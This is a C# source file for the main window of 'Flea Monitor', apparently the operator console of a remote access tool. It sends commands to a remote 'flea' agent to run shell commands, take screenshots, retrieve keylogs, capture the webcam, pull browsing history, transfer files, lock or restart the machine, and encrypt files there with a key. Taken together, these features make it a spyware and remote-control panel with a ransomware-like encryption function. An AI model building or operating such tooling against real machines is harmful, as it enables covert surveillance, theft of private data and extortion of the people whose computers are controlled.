﻿ using FleaMonitor.Auxiliary;
using FleaMonitor.Dialog;
using FleaMonitor.FTP;
using FleaMonitor.Model;
using FleaMonitor.Properties;
using FleaMonitor.Server;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;

namespace FleaMonitor
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private const string FLEA_MONITOR_VERSION = "Flea Monitor v0.2.3";
        public const int ENCYPTION_KEY_LENGTH = 32;

        private readonly FleaInfo _fleaInfo = new();
        private readonly FleaFTPServer _fleaFTPServer = new();
        private bool _commandInExecution = false;

        private readonly Dictionary<string, bool> _commandWithParameterHash = new()
        {
            { CommandProcessor.VERSION_COMMAND, false },
            { CommandProcessor.BASH_COMMAND, true },
            { CommandProcessor.FTPSCREENSHOT_COMMAND, false },
            { CommandProcessor.SCREENSHOT_COMMAND, false },
            { CommandProcessor.LOG_COMMAND, false },
            { CommandProcessor.PROCLIST_COMMAND, false },
            { CommandProcessor.KILL_COMMAND, true },
            { CommandProcessor.UPLOAD_COMMAND, true },
            { CommandProcessor.GET_WORKING_DIR_COMMAND, false },
            { CommandProcessor.DIR_COMMAND, false },
            { CommandProcessor.CD_COMMAND, true },
            { CommandProcessor.GETFILE_COMMAND, true },
            { CommandProcessor.SET_FTP_COMMAND, true },
            { CommandProcessor.BROWSING_HISTORY_COMMAND, false },
            { CommandProcessor.GET_CAMERA_CAPTURE_COMMAND, true },
            { CommandProcessor.GET_SYSTEM_INFO_COMMAND, false },
            { CommandProcessor.RESTART_COMMAND, false },
            { CommandProcessor.LOCK_SCREEN_COMMAND, false },
            { CommandProcessor.ENCRYPT_COMMAND, true },
            { CommandProcessor.DECRYPT_COMMAND, true },
            { CommandProcessor.SETEMAIL_COMMAND, true },
            { CommandProcessor.SEND_KEYLOG_COMMAND, false },
            { CommandProcessor.QUIT_COMMAND, false }
        };

        private readonly Dictionary<string, bool> _commandsWithAllOutputHash = new()
        {
            { CommandProcessor.VERSION_COMMAND, true },
            { CommandProcessor.BASH_COMMAND, true },
            { CommandProcessor.FTPSCREENSHOT_COMMAND, true },
            { CommandProcessor.SCREENSHOT_COMMAND, false },
            { CommandProcessor.LOG_COMMAND, true },
            { CommandProcessor.PROCLIST_COMMAND, true },
            { CommandProcessor.KILL_COMMAND, true },
            { CommandProcessor.UPLOAD_COMMAND, true },
            { CommandProcessor.GET_WORKING_DIR_COMMAND, true },
            { CommandProcessor.DIR_COMMAND, true },
            { CommandProcessor.CD_COMMAND, true },
            { CommandProcessor.GETFILE_COMMAND, false },
            { CommandProcessor.SET_FTP_COMMAND, true },
            { CommandProcessor.BROWSING_HISTORY_COMMAND, false },
            { CommandProcessor.GET_CAMERA_CAPTURE_COMMAND, false },
            { CommandProcessor.GET_SYSTEM_INFO_COMMAND, true },
            { CommandProcessor.RESTART_COMMAND, true },
            { CommandProcessor.LOCK_SCREEN_COMMAND, true },
            { CommandProcessor.ENCRYPT_COMMAND, true },
            { CommandProcessor.DECRYPT_COMMAND, true },
            { CommandProcessor.SETEMAIL_COMMAND, true },
            { CommandProcessor.SEND_KEYLOG_COMMAND, false },
            { CommandProcessor.QUIT_COMMAND, true }
        };

        public MainWindow()
        {
            InitializeComponent();
            InitData();

            _fleaInfo.Txt = FLEA_MONITOR_VERSION + "\n";
            _fleaInfo.Txt = $"Saving path: {CommandProcessor.WorkingPath}\n\n";
        }

        private void InitData()
        {
            dirListView.ItemsSource = new List<FleaDirectory>();
            infoTextBlock.DataContext = _fleaInfo;

            commandComboBox.ItemsSource = new List<string>
            {
                CommandProcessor.VERSION_COMMAND,
                CommandProcessor.BASH_COMMAND,
                CommandProcessor.FTPSCREENSHOT_COMMAND,
                CommandProcessor.SET_FTP_COMMAND,
                CommandProcessor.SCREENSHOT_COMMAND,
                CommandProcessor.LOG_COMMAND,
                CommandProcessor.PROCLIST_COMMAND,
                CommandProcessor.KILL_COMMAND,
                CommandProcessor.UPLOAD_COMMAND,
                CommandProcessor.GET_WORKING_DIR_COMMAND,
                CommandProcessor.DIR_COMMAND,
                CommandProcessor.CD_COMMAND,
                CommandProcessor.GETFILE_COMMAND,
                CommandProcessor.BROWSING_HISTORY_COMMAND,
                CommandProcessor.GET_CAMERA_CAPTURE_COMMAND,
                CommandProcessor.GET_SYSTEM_INFO_COMMAND,
                CommandProcessor.RESTART_COMMAND,
                CommandProcessor.LOCK_SCREEN_COMMAND,
                CommandProcessor.ENCRYPT_COMMAND,
                CommandProcessor.DECRYPT_COMMAND,
                CommandProcessor.SETEMAIL_COMMAND,
                CommandProcessor.SEND_KEYLOG_COMMAND,
                CommandProcessor.QUIT_COMMAND
            };
        }

        private async Task<byte[]> SendCommand(string cmd, string param, FleaInfo? fleaInfo)
        {
            _commandInExecution = true;

            try
            {
                return await FleaServer.SendCommand(CommandProcessor.CreateXML(cmd, param),
                    Settings.Default.FleaIP, Convert.ToInt32(Settings.Default.FleaPort),
                    fleaInfo, _commandsWithAllOutputHash[cmd]);
            }
            catch (ArgumentNullException ane)
            {
                _fleaInfo.Txt = $"ArgumentNullException : {ane}\n";
            }
            catch (System.Net.Sockets.SocketException se)
            {
                _fleaInfo.Txt = $"SocketException : {se}\n";
            }
            catch (Exception ex)
            {
                _fleaInfo.Txt = $"Unexpected exception : {ex}\n";
            }
            finally
            {
                _commandInExecution = false;
                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    textScroll.ScrollToEnd();
                });
            }

            return Array.Empty<byte>();
        }

        private async Task ReadDirectory()
        {
            try
            {
                var result = await SendCommand(CommandProcessor.DIR_COMMAND, string.Empty, null);
                var str = Encoding.UTF8.GetString(result, 0, result.Length);
                var lines = str.Split(new char[] { '\n' });
                var lst = new List<FleaDirectory>
                {
                    new FleaDirectory
                    {
                        Txt = ".."
                    }
                };
                lst.AddRange(lines.Select(s => new FleaDirectory
                {
                    Txt = s.Replace("\r", "")
                }));

                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    dirListView.ItemsSource = lst;
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private async void SendButton_Click(object sender, RoutedEventArgs e)
        {
            var idx = commandComboBox.SelectedIndex;
            
            if (idx == -1)
            {
                MessageBox.Show("Please select a command.");
                return;
            }

            if (_commandInExecution)
            {
                MessageBox.Show("Command is executing now..");
                return;
            }

            var cmd = commandComboBox.SelectedItem.ToString();
            var value = _commandWithParameterHash[cmd!] ? ReadParameter(cmd) : string.Empty;

            if (value == string.Empty && _commandWithParameterHash[cmd!])
            {
                return;
            }

            var waitWindow = new WaitWindow
            {
                Owner = this
            };
            waitWindow.Show();

            var result = await SendCommand(cmd!, value, _fleaInfo);

            try
            {
                CommandProcessor.ProcessReply(cmd!, value, result, _fleaInfo);
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }

            waitWindow.Close();
        }

        private async void Window_Loaded(object sender, RoutedEventArgs e) => await Task.Run(ReadDirectory);

        private void MenuItem_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private static string ReadParameter(string? cmd)
        {
            //Open ValueWindow
            var valueWindow = new ValueWindow
            {
                Owner = Application.Current.MainWindow
            };

            if (cmd != null && cmd == CommandProcessor.GET_CAMERA_CAPTURE_COMMAND)
            {
                valueWindow.valueTextBox.Text = ".wmv";
            }

            var result = valueWindow.ShowDialog();
            if (result.HasValue && result.Value)
            {
                return valueWindow.valueTextBox.Text;
            }

            return string.Empty;
        }

        private async void DirListView_MouseDoubleClick(object sender, System.Windows.Input.MouseButtonEventArgs? e)
        {
            if (_commandInExecution)
            {
                MessageBox.Show("Command is executing now..");
                return;
            }

            //Select item from listview
            var item = dirListView.SelectedItem as FleaDirectory;
            if (item is not null)
            {
                var waitWindow = new WaitWindow
                {
                    Owner = this
                };

                waitWindow.Show();

                var value = item.Txt;
                if (value?.IndexOf("/") != -1 || value?.IndexOf("\\") != -1)
                {
                    //Directory
                    await SendCommand(CommandProcessor.CD_COMMAND, value!, _fleaInfo);
                    await ReadDirectory();
                }
                else if(value == "..")
                {
                    //Directory up
                    await SendCommand(CommandProcessor.CD_COMMAND, "..", _fleaInfo);
                    await ReadDirectory();
                }
                else
                {
                    //File
                    var result = await SendCommand(CommandProcessor.GETFILE_COMMAND, value, _fleaInfo);
                    
                    try
                    {
                        CommandProcessor.ProcessReply(CommandProcessor.GETFILE_COMMAND, value, result, _fleaInfo);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                    
                    await ReadDirectory();
                }

                waitWindow.Close();
            }
        }

        private async void MenuItem_StartFTPServer(object sender, RoutedEventArgs e)
        {
            if (!_fleaFTPServer.IsStarted)
            {
                await _fleaFTPServer.Init();
                MessageBox.Show("FTP Server started.");
            }
            else
            {
                MessageBox.Show("FTP Server is already started.");
            }
        }

        private async void MenuItem_StopFTPServer(object sender, RoutedEventArgs e)
        {
            if (_fleaFTPServer.IsStarted)
            {
                await _fleaFTPServer.Stop();
                MessageBox.Show("FTP Server stopped.");
            }
        }

        private async void Window_Closed(object sender, EventArgs e)
        {
            if (_fleaFTPServer.IsStarted)
            {
                await _fleaFTPServer.Stop();
            }
        }

        private void MenuItem_ShowInfo(object sender, RoutedEventArgs e)
        {
            MessageBox.Show($"{FLEA_MONITOR_VERSION}\n\nDeveloped by: Rozen Software\n\nhttps://github.com/rozensoftware/flea", "About", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        private void MenuItem_Settings(object sender, RoutedEventArgs e)
        {
            var settings = new SettingsWindow
            {
                Owner = this
            };

            settings.fleaIPTextBlox.Text = Settings.Default.FleaIP;
            settings.encryptionKeyTextBlox.Text = Settings.Default.EncryptionKey;
            
            var result = settings.ShowDialog();
            if (result.HasValue && result.Value)
            {                
                //Save settings
                Settings.Default.FleaIP = settings.fleaIPTextBlox.Text;
                Settings.Default.EncryptionKey = settings.encryptionKeyTextBlox.Text;
                Settings.Default.Save();
            }
        }

        private void MenuItem_ClearLog(object sender, RoutedEventArgs e)
        {
            _fleaInfo.ClearTxt();
        }

        private void MenuItem_SaveLog(object sender, RoutedEventArgs e)
        {
            //Save _fleaInfo.Txt to file
            var saveFileDialog = new SaveFileDialog
            {
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*",
                FilterIndex = 1,
                RestoreDirectory = true
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                File.WriteAllText(saveFileDialog.FileName, _fleaInfo.Txt);
                MessageBox.Show("Log saved.");
            }
        }

        private void MenuItem_FTP_Folder(object sender, RoutedEventArgs e)
        {
            FleaFTPServer.OpenFTPFolder();
        }

        private void MenuItem_CleanLog(object sender, RoutedEventArgs e)
        {
            _fleaInfo.Txt = "Cleaned log:";
            _fleaInfo.Txt = CommandProcessor.LastCleanedLog;
        }

        private void DirListView_MouseRightButtonUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (FindResource("listSubMenu") is ContextMenu cm)
            {
                cm.Placement = PlacementMode.MousePoint;
                cm.IsOpen = true;
            }
        }

        private void MenuItem_SubMenu_Download(object sender, RoutedEventArgs e) => DirListView_MouseDoubleClick(sender, null);

        private bool _isEncryptionKeyValid(string key)
        {
            if (key.Length != ENCYPTION_KEY_LENGTH)
            {
                MessageBox.Show($"Encryption key must be {ENCYPTION_KEY_LENGTH} characters long.");
                return false;
            }

            return true;
        }

        private async Task ExecuteSubMenuItem(string cmd)
        {
            if (_commandInExecution)
            {
                MessageBox.Show("Command is executing now..");
                return;
            }

            //Select item from listview
            var item = dirListView.SelectedItem as FleaDirectory;
            if (item is not null)
            {
                var value = item.Txt;
                if (value?.IndexOf('/') != -1 || value?.IndexOf('\\') != -1 || value == "..")
                {
                    MessageBox.Show($"{value} is a directory.");
                }
                else
                {
                    var waitWindow = new WaitWindow
                    {
                        Owner = this
                    };

                    waitWindow.Show();

                    if(cmd.Equals("execute"))
                    {
                        var working_dir = await SendCommand(CommandProcessor.GET_WORKING_DIR_COMMAND, value, _fleaInfo);
                        var result = await SendCommand(CommandProcessor.BASH_COMMAND, Path.Join(Encoding.UTF8.GetString(working_dir), value), _fleaInfo);

                        try
                        {
                            CommandProcessor.ProcessReply(CommandProcessor.BASH_COMMAND, value, result, _fleaInfo);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                    }
                    else if(cmd.Equals("encrypt"))
                    {
                        var key = Settings.Default.EncryptionKey;

                        if (!_isEncryptionKeyValid(key))
                        {
                            waitWindow.Close();
                            return;
                        }

                        value = $"{key};{value}";

                        var result = await SendCommand(CommandProcessor.ENCRYPT_COMMAND, value, _fleaInfo);

                        try
                        {
                            CommandProcessor.ProcessReply(CommandProcessor.ENCRYPT_COMMAND, value, result, _fleaInfo);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                    }
                    else if(cmd.Equals("decrypt"))
                    {
                        var key = Settings.Default.EncryptionKey;

                        if (!_isEncryptionKeyValid(key))
                        {
                            waitWindow.Close();
                            return;
                        }

                        value = $"{key};{value}";

                        var result = await SendCommand(CommandProcessor.DECRYPT_COMMAND, value, _fleaInfo);

                        try
                        {
                            CommandProcessor.ProcessReply(CommandProcessor.DECRYPT_COMMAND, value, result, _fleaInfo);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                    }

                    waitWindow.Close();
                }
            }
        }

        private async void MenuItem_SubMenu_Execute(object sender, RoutedEventArgs e)
        {
            await ExecuteSubMenuItem("execute");
        }

        private async void MenuItem_Click_Encrypt(object sender, RoutedEventArgs e)
        {
            await ExecuteSubMenuItem("encrypt");
        }

        private async void MenuItem_Click_Decrypt(object sender, RoutedEventArgs e)
        {
            await ExecuteSubMenuItem("decrypt");
        }
    }
}
